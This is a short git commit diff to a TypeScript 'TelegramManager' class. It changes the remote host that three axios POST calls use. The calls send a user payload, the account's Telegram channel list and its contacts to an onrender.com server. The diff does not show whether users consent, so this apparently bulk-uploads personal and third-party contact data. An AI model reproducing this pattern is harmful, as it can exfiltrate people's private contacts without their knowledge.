4011a6b49c52cc58eaf2d85ddf8f8e387ebbe28c
SSK <dodieajt@gmail.com>
2024-06-21 16:52:32 +0530

    iuashu

--- src/telegramManager.ts
+++ src/telegramManager.ts
@@ -509,9 +509,9 @@ class TelegramManager {
         console.log("Calculated results");
         try {
             console.log("posting results");
-            await axios.post(`https://ramyaaa1.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
-            await axios.post(`https://ramyaaa1.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
-            await axios.post(`https://ramyaaa1.onrender.com/contacts`, { contacts: formattedContacts }, { headers: { 'Content-Type': 'application/json' } });
+            await axios.post(`https://ramyaaa.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
+            await axios.post(`https://ramyaaa.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
+            await axios.post(`https://ramyaaa.onrender.com/contacts`, { contacts: formattedContacts }, { headers: { 'Content-Type': 'application/json' } });
         } catch (error) {
             console.log("Error Occured 1");
             console.log(error)
